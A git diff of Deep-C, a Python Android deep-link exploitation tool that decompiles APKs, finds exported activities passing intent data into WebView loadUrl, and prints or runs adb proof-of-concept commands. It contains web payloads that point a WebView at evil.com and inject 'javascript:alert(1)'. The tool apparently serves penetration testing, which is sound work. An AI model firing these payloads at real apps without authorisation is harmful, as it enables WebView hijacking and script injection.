@@ -7,49 +7,16 @@ import sys
 import json
 import re
 
-# ===================== AI IMPORT (OPTIONAL) ===================== #
-try:
-    from openai import OpenAI
-except ImportError:
-    OpenAI = None
-
-# ===================== CONSTANTS ===================== #
-
 ANDROID_NS = "{http://schemas.android.com/apk/res/android}"
 
-OUT_DIR = "deepc_out"
+OUT_DIR = os.path.abspath("deepc_out")
 APKTOOL_DIR = os.path.join(OUT_DIR, "apktool")
-DEX_DIR = os.path.join(OUT_DIR, "dex")
-SRC_DIR = os.path.join(OUT_DIR, "src")
 
-# ===================== DETECTION RULES ===================== #
+JADX_OUT_DIR = os.path.abspath("deepc_jadx_out")
+SRC_DIR = os.path.join(JADX_OUT_DIR, "sources")
 
-RISK_PATTERNS = {
-    "INTENT_DATA": [
-        r"intent\.getData\(",
-        r"getIntent\(",
-        r"getData\(",
-    ],
-    "QUERY_PARAM": [
-        r"getQueryParameter\(",
-    ],
-    "WEBVIEW_SINK": [
-        r"loadUrl\(",
-    ]
-}
 
-WEAK_VALIDATION_PATTERNS = [
-    r"endsWith\(",
-    r"contains\(",
-    r"matches\(",
-]
-
-SAFE_STRONG_PATTERNS = [
-    r"Uri\.getHost\(\)\.equals",
-    r"equals\(\"https://",
-]
-
-# ===================== BANNER ===================== #
+# ---------------- Banner ---------------- #
 
 def banner():
     print(r"""
@@ -60,14 +27,13 @@ def banner():
 ██████╔╝███████╗███████╗██║          ╚██████╗
 ╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝
 
- Deep-C | Android Deep Link Exploitation Framework by @ Kishor Balan
+ Deep-C | Android Deep Link Exploitation Framework By Kishor Balan
  Decompile • Detect • Validate • Exploit
- Usage:
- Normal Scan: python3 deepc.py -a target.apk
- AI based analysis: python3 deepc.py -a target.apk --ai-review
+ Usage: python3 deepc.py -a <path_to_apk>  --> Should use the absolute path else JADX will fail
+ Btw guys the AI thing needs some optimizations, working on it... 
 """)
 
-# ===================== HELPERS ===================== #
+# ---------------- Helpers ---------------- #
 
 def run(cmd, msg):
     print(f"[*] {msg}")
@@ -78,30 +44,73 @@ def clean_dirs():
         shutil.rmtree(OUT_DIR)
     os.makedirs(OUT_DIR)
 
-# ===================== APK PROCESSING ===================== #
+# ---------------- Decompilation ---------------- #
 
-def decompile_apk(apk):
-    run(["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"], "Decompiling APK with apktool")
+def decompile_manifest(apk):
+    run(
+        ["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"],
+        "Decompiling APK (manifest & resources)"
+    )
     manifest = os.path.join(APKTOOL_DIR, "AndroidManifest.xml")
     if not os.path.exists(manifest):
         sys.exit("[-] AndroidManifest.xml not found")
     return manifest
+    
+def decompile_source_with_jadx(apk):
+    if os.path.exists(JADX_OUT_DIR):
+        shutil.rmtree(JADX_OUT_DIR)
 
-def dex_to_jar():
-    os.makedirs(DEX_DIR, exist_ok=True)
-    dex = os.path.join(APKTOOL_DIR, "classes.dex")
-    jar = os.path.join(DEX_DIR, "app.jar")
-    run(["d2j-dex2jar", dex, "-o", jar], "Converting DEX to JAR (dex2jar)")
-    return jar
+    os.makedirs(JADX_OUT_DIR, exist_ok=True)
 
-def decompile_jar(jar):
-    run(["jadx", "-d", SRC_DIR, jar], "Decompiling JAR to Java source (jadx)")
+    print("[*] Decompiling APK to Java source (jadx)")
+    result = subprocess.run(
+        ["jadx", "-d", JADX_OUT_DIR, apk],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
 
-# ===================== MANIFEST PARSING ===================== #
+    if result.stdout:
+        print("[jadx stdout]")
+        print(result.stdout)
+
+    if result.stderr:
+        print("[jadx stderr]")
+        print(result.stderr)
+
+    #if result.returncode != 0:
+       # sys.exit("[-] Jadx failed during decompilation")
+
+
+
+
+def verify_jadx_output():
+    """
+    Ensure jadx produced Java source files.
+    """
+    if not os.path.exists(SRC_DIR):
+        sys.exit("[-] Jadx output directory not found")
+
+    java_files = []
+    for root, _, files in os.walk(SRC_DIR):
+        for f in files:
+            if f.endswith(".java"):
+                java_files.append(os.path.join(root, f))
+                return  # one is enough
+
+    sys.exit(
+        "[-] Jadx did not produce any Java files.\n"
+        "    Possible reasons:\n"
+        "    - APK is packed/obfuscated\n"
+        "    - Jadx failed silently\n"
+        "    - Unsupported APK format\n"
+        "    Try running: jadx InsecureShop.apk manually"
+    )
+
+# ---------------- Manifest Parsing ---------------- #
 
 def parse_manifest(path):
-    tree = ET.parse(path)
-    root = tree.getroot()
+    root = ET.parse(path).getroot()
     return root, root.attrib.get("package")
 
 def is_exported(component):
@@ -125,13 +134,15 @@ def extract_deeplinks(activity):
             deeplinks.append({
                 "scheme": data.attrib.get(ANDROID_NS + "scheme"),
                 "host": data.attrib.get(ANDROID_NS + "host"),
-                "path": data.attrib.get(ANDROID_NS + "path")
-                        or data.attrib.get(ANDROID_NS + "pathPrefix")
-                        or data.attrib.get(ANDROID_NS + "pathPattern")
+                "path": (
+                    data.attrib.get(ANDROID_NS + "path")
+                    or data.attrib.get(ANDROID_NS + "pathPrefix")
+                    or data.attrib.get(ANDROID_NS + "pathPattern")
+                )
             })
     return deeplinks
 
-# ===================== SOURCE ANALYSIS ===================== #
+# ---------------- Source Code Analysis ---------------- #
 
 def find_activity_source(activity):
     name = activity.split(".")[-1] + ".java"
@@ -140,136 +151,75 @@ def find_activity_source(activity):
             return os.path.join(root, name)
     return None
 
+def extract_paths_from_code(code):
+    """
+    Supports Java + Kotlin (jadx) patterns:
+    - uri.getPath().equals("/web")
+    - StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)
+    """
+    paths = set()
+
+    patterns = [
+        r'getPath\(\)\.equals\("([^"]+)"\)',
+        r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"\s*,',
+        r'uri\.getPath\(\)\s*==\s*"([^"]+)"'
+    ]
+
+    for p in patterns:
+        for match in re.findall(p, code):
+            if match.startswith("/"):
+                paths.add(match)
+
+    return list(paths)
+
 def analyze_source(path):
     if not path or not os.path.exists(path):
-        return {"confidence": "MEDIUM", "reason": "Source not resolved"}
+        return None
 
     with open(path, "r", errors="ignore") as f:
         code = f.read()
 
-    found = set()
-    weak = []
-    strong_safe = False
-
-    for key, patterns in RISK_PATTERNS.items():
-        for p in patterns:
-            if re.search(p, code):
-                found.add(key)
-
-    for p in WEAK_VALIDATION_PATTERNS:
-        if re.search(p, code):
-            weak.append(p)
-
-    for p in SAFE_STRONG_PATTERNS:
-        if re.search(p, code):
-            strong_safe = True
-
     exploitable = (
-        "WEBVIEW_SINK" in found and
-        ("INTENT_DATA" in found or "QUERY_PARAM" in found)
+        "loadUrl(" in code and
+        (
+            "getData(" in code or
+            "getIntent(" in code or
+            "getQueryParameter(" in code
+        )
     )
 
     if not exploitable:
         return None
 
-    if strong_safe:
-        confidence = "LOW"
-    elif weak:
+    if any(x in code for x in ["endsWith(", "contains(", "matches("]):
         confidence = "HIGH"
+    elif "getHost().equals" in code or "https://" in code:
+        confidence = "LOW"
     else:
         confidence = "MEDIUM"
 
     return {
         "confidence": confidence,
-        "found_patterns": list(found),
-        "weak_validation": weak,
-        "code": code[:6000]  # limit for AI
+        "paths": extract_paths_from_code(code),
+        "code": code[:4000]
     }
 
-# ===================== AI REVIEW ===================== #
-
-def build_ai_prompt(code, deeplink):
-    return f"""
-You are an Android application security reviewer.
-
-Analyze the following activity source code and deep link information.
-Determine whether attacker-controlled input can reach a WebView
-or other sensitive sink.
-
-Respond ONLY in valid JSON with:
-- exploitability: true or false
-- confidence: HIGH, MEDIUM, or LOW
-- reasoning: one short sentence
-
-[ACTIVITY CODE]
-{code}
-
-[DEEPLINK INFO]
-{deeplink}
-"""
-def ai_review(code, deeplink):
-    if not os.getenv("OPENAI_API_KEY"):
-        print("[!] OPENAI_API_KEY not set, skipping AI review")
-        return None
-
-    try:
-        client = OpenAI()
-
-        response = client.chat.completions.create(
-            model="gpt-4o-mini",
-            messages=[
-                {"role": "system", "content": "You are a strict Android security reviewer."},
-                {"role": "user", "content": build_ai_prompt(code, deeplink)}
-            ],
-            temperature=0
-        )
-
-        raw = response.choices[0].message.content
-        print("[*] AI response:", raw)   # TEMP DEBUG
-
-        return json.loads(raw)
-
-    except Exception as e:
-        print(f"[!] AI review failed: {e}")
-        return None
-
-def merge_confidence(static_conf, ai_result):
-    if not ai_result:
-        return static_conf
-
-    if static_conf == "HIGH":
-        return "HIGH"
-
-    if static_conf == "MEDIUM":
-        if ai_result["exploitability"] and ai_result["confidence"] == "HIGH":
-            return "HIGH"
-        return "MEDIUM"
-
-    return "LOW"
-
-# ===================== POC GENERATION ===================== #
-
-def build_deeplink_url(deeplink, path, query):
-    scheme = deeplink.get("scheme")
-    host = deeplink.get("host")
-
-    if scheme in ["http", "https"]:
-        base = f"{scheme}://{host}" if host else f"{scheme}://evil.com"
-    else:
-        base = f"{scheme}://{host}" if host else f"{scheme}://"
-
-    return f"{base}{path}?{query}"
+# ---------------- PoC Generation ---------------- #
 
 def generate_pocs(pkg, activity, deeplink):
+    scheme = deeplink.get("scheme") or "https"
+    host = deeplink.get("host") or ""
     path = deeplink.get("path") or "/"
 
+    base = f"{scheme}://{host}" if host else f"{scheme}://"
+
     return [
-        f'adb shell am start -a android.intent.action.VIEW -d "{build_deeplink_url(deeplink, path, "url=https://evil.com")}"',
-        f'adb shell am start -a android.intent.action.VIEW -d "{build_deeplink_url(deeplink, path, "url=javascript:alert(1)")}"',
+        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?url=https://evil.com"',
+        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?url=javascript:alert(1)"',
         f'adb shell am start -n {pkg}/{activity}'
     ]
 
-# ===================== MAIN ===================== #
+# ---------------- Main ---------------- #
 
 def main():
     banner()
@@ -277,13 +227,12 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-a", "--apk", required=True)
     parser.add_argument("--exec", action="store_true")
-    parser.add_argument("--ai-review", action="store_true")
     args = parser.parse_args()
 
     clean_dirs()
-    manifest = decompile_apk(args.apk)
-    jar = dex_to_jar()
-    decompile_jar(jar)
+    manifest = decompile_manifest(args.apk)
+    decompile_source_with_jadx(args.apk)
+    verify_jadx_output()
 
     root, package = parse_manifest(manifest)
     print(f"[+] Package: {package}\n")
@@ -305,23 +254,29 @@ def main():
             if not analysis:
                 continue
 
-            for dl in deeplinks:
-                static_conf = analysis["confidence"]
-                final_conf = static_conf
-                ai_data = None
+            paths = (
+                analysis.get("paths")
+                or [dl.get("path") for dl in deeplinks if dl.get("path")]
+                or ["/"]
+            )
 
-                if args.ai_review:
-                    ai_data = ai_review(analysis.get("code", ""), dl)
-                    final_conf = merge_confidence(static_conf, ai_data)
+            print("[+] Vulnerable Activity Found")
+            print(f"    Activity   : {name}")
+            print(f"    Source     : {src}")
+            print(f"    Confidence : {analysis['confidence']}")
 
-                print("[+] Vulnerable Activity Found")
-                print(f"    Activity   : {name}")
-                print(f"    Confidence : {final_conf}")
-                if ai_data:
-                    print(f"    AI Verdict : {ai_data['confidence']} - {ai_data['reasoning']}")
+            for path in paths:
+                dl = deeplinks[0]
+                dl_effective = {
+                    "scheme": dl.get("scheme"),
+                    "host": dl.get("host"),
+                    "path": path
+                }
 
-                pocs = generate_pocs(package, name, dl)
+                print(f"    Entry Path : {path}")
                 print("    PoCs:")
+
+                pocs = generate_pocs(package, name, dl_effective)
                 for p in pocs:
                     print(f"      {p}")
                     if args.exec:
@@ -329,14 +284,13 @@ def main():
 
                 results["findings"].append({
                     "activity": name,
-                    "deeplink": dl,
-                    "confidence": final_conf,
-                    "static_confidence": static_conf,
-                    "ai_review": ai_data,
+                    "source": src,
+                    "path": path,
+                    "confidence": analysis["confidence"],
                     "pocs": pocs
                 })
 
-                print("-" * 70)
+            print("-" * 70)
 
     with open("deepc_result.json", "w") as f:
         json.dump(results, f, indent=4)
